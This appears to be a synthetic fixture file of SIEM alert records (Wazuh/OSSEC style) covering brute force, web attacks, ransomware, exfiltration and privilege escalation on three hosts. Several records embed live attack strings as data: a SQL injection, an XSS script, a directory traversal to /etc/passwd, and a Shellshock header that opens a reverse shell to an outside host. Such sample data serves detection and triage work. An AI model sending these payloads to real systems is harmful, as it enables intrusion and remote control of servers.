@@ -1,0 +1,142 @@
+[
+  {
+    "timestamp": "2026-02-17T08:01:12.000+0000",
+    "rule": { "id": "5763", "level": 12, "description": "Multiple authentication failures followed by a success - possible brute force attack", "groups": ["authentication_success", "authentication_failures"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "185.220.101.45", "dstip": "192.168.1.10", "srcport": "54321", "dstport": "22", "protocol": "ssh" },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:05:44.000+0000",
+    "rule": { "id": "31103", "level": 10, "description": "SQL injection attempt detected in web request", "groups": ["web", "attack", "sql_injection"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "198.51.100.78", "dstip": "192.168.1.10", "srcport": "44231", "dstport": "80", "protocol": "http", "url": "/admin/login?id=1' OR '1'='1" },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:09:33.000+0000",
+    "rule": { "id": "40101", "level": 12, "description": "Rootkit detected: hidden process found on system", "groups": ["rootkit", "malware"] },
+    "agent": { "id": "002", "name": "db-server-01", "ip": "192.168.1.20" },
+    "data": { "srcip": "192.168.1.20", "process": "kworker/u8:3", "pid": "4821" },
+    "location": "/var/ossec/rootcheck"
+  },
+  {
+    "timestamp": "2026-02-17T08:13:10.000+0000",
+    "rule": { "id": "1002", "level": 7, "description": "Unknown problem somewhere in the system - possible attack", "groups": ["syslog", "errors"] },
+    "agent": { "id": "003", "name": "workstation-01", "ip": "192.168.1.30" },
+    "data": { "srcip": "203.0.113.92", "dstip": "192.168.1.30", "srcport": "61234", "dstport": "445", "protocol": "smb" },
+    "location": "/var/log/syslog"
+  },
+  {
+    "timestamp": "2026-02-17T08:17:55.000+0000",
+    "rule": { "id": "5501", "level": 9, "description": "Attempt to login using a denied user", "groups": ["authentication_failed", "policy_violation"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "91.240.118.172", "dstip": "192.168.1.10", "user": "root", "dstport": "22", "protocol": "ssh" },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:22:19.000+0000",
+    "rule": { "id": "31151", "level": 9, "description": "XSS attack attempt detected in web request", "groups": ["web", "attack", "xss"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "45.142.212.100", "dstip": "192.168.1.10", "srcport": "39211", "dstport": "443", "url": "/search?q=<script>alert('xss')</script>" },
+    "location": "/var/log/nginx/access.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:26:48.000+0000",
+    "rule": { "id": "5402", "level": 5, "description": "Successful sudo to root executed", "groups": ["sudo", "privilege_escalation"] },
+    "agent": { "id": "003", "name": "workstation-01", "ip": "192.168.1.30" },
+    "data": { "srcip": "192.168.1.30", "user": "jsmith", "command": "/bin/bash" },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:31:05.000+0000",
+    "rule": { "id": "40111", "level": 11, "description": "Malware detected: trojan signature found in uploaded file", "groups": ["malware", "virus"] },
+    "agent": { "id": "002", "name": "db-server-01", "ip": "192.168.1.20" },
+    "data": { "srcip": "77.88.55.66", "file": "/tmp/update.sh", "signature": "Trojan.GenericKD.46584785" },
+    "location": "/var/ossec/rootcheck"
+  },
+  {
+    "timestamp": "2026-02-17T08:35:22.000+0000",
+    "rule": { "id": "2932", "level": 8, "description": "Shellshock attack attempt detected", "groups": ["web", "attack", "shellshock"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "104.244.74.51", "dstip": "192.168.1.10", "srcport": "52019", "dstport": "80", "user_agent": "() { :;}; /bin/bash -i >& /dev/tcp/104.244.74.51/4444 0>&1" },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:39:47.000+0000",
+    "rule": { "id": "5706", "level": 6, "description": "SSH insecure connection attempt (scan)", "groups": ["sshd", "recon"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "193.32.162.157", "dstip": "192.168.1.10", "srcport": "60001", "dstport": "22", "protocol": "ssh" },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:44:01.000+0000",
+    "rule": { "id": "18101", "level": 9, "description": "Ransomware behaviour detected: mass file encryption started", "groups": ["ransomware", "malware"] },
+    "agent": { "id": "003", "name": "workstation-01", "ip": "192.168.1.30" },
+    "data": { "srcip": "192.168.1.30", "files_encrypted": "347", "extension": ".locked", "process": "svchost.exe" },
+    "location": "/var/ossec/rootcheck"
+  },
+  {
+    "timestamp": "2026-02-17T08:48:33.000+0000",
+    "rule": { "id": "5503", "level": 5, "description": "User account created", "groups": ["account_changes"] },
+    "agent": { "id": "002", "name": "db-server-01", "ip": "192.168.1.20" },
+    "data": { "srcip": "192.168.1.20", "user": "backdoor_user", "created_by": "root" },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:52:14.000+0000",
+    "rule": { "id": "31106", "level": 10, "description": "Remote code execution attempt via file upload", "groups": ["web", "attack", "rce"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "185.156.73.21", "dstip": "192.168.1.10", "url": "/upload.php", "filename": "shell.php", "dstport": "80" },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "timestamp": "2026-02-17T08:56:59.000+0000",
+    "rule": { "id": "5716", "level": 3, "description": "SSH authentication success", "groups": ["authentication_success", "sshd"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "192.168.1.50", "dstip": "192.168.1.10", "user": "admin", "dstport": "22", "protocol": "ssh" },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-02-17T09:01:45.000+0000",
+    "rule": { "id": "40302", "level": 12, "description": "Critical: Data exfiltration detected - large outbound transfer to suspicious IP", "groups": ["data_exfiltration", "network"] },
+    "agent": { "id": "002", "name": "db-server-01", "ip": "192.168.1.20" },
+    "data": { "srcip": "192.168.1.20", "dstip": "91.108.56.130", "bytes_sent": "524288000", "protocol": "ftp", "dstport": "21" },
+    "location": "/var/log/syslog"
+  },
+  {
+    "timestamp": "2026-02-17T09:05:22.000+0000",
+    "rule": { "id": "20101", "level": 8, "description": "Port scan detected - multiple ports probed in short time", "groups": ["recon", "portscan"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "45.33.32.156", "dstip": "192.168.1.10", "ports_scanned": "3240", "protocol": "tcp" },
+    "location": "/var/log/syslog"
+  },
+  {
+    "timestamp": "2026-02-17T09:09:11.000+0000",
+    "rule": { "id": "5551", "level": 4, "description": "Firewall rule modified by user", "groups": ["firewall", "policy_change"] },
+    "agent": { "id": "003", "name": "workstation-01", "ip": "192.168.1.30" },
+    "data": { "srcip": "192.168.1.30", "user": "jsmith", "rule_changed": "iptables -F" },
+    "location": "/var/log/syslog"
+  },
+  {
+    "timestamp": "2026-02-17T09:13:38.000+0000",
+    "rule": { "id": "31201", "level": 11, "description": "Directory traversal attack detected", "groups": ["web", "attack"] },
+    "agent": { "id": "001", "name": "web-server-01", "ip": "192.168.1.10" },
+    "data": { "srcip": "5.188.206.26", "dstip": "192.168.1.10", "url": "/../../../../etc/passwd", "dstport": "443" },
+    "location": "/var/log/nginx/access.log"
+  },
+  {
+    "timestamp": "2026-02-17T09:17:55.000+0000",
+    "rule": { "id": "5104", "level": 6, "description": "Multiple failed logins on the same account", "groups": ["authentication_failed"] },
+    "agent": { "id": "002", "name": "db-server-01", "ip": "192.168.1.20" },
+    "data": { "srcip": "179.60.150.34", "user": "admin", "failed_attempts": "15", "dstport": "3306", "protocol": "mysql" },
+    "location": "/var/log/mysql/error.log"
+  },
+  {
+    "timestamp": "2026-02-17T09:22:10.000+0000",
+    "rule": { "id": "40501", "level": 13, "description": "Critical: Privilege escalation via kernel exploit detected", "groups": ["exploit", "privilege_escalation"] },
+    "agent": { "id": "002", "name": "db-server-01", "ip": "192.168.1.20" },
+    "data": { "srcip": "192.168.1.20", "exploit": "CVE-2023-0386", "process": "python3", "user_before": "www-data", "user_after": "root" },
+    "location": "/var/ossec/rootcheck"
+  }
+]
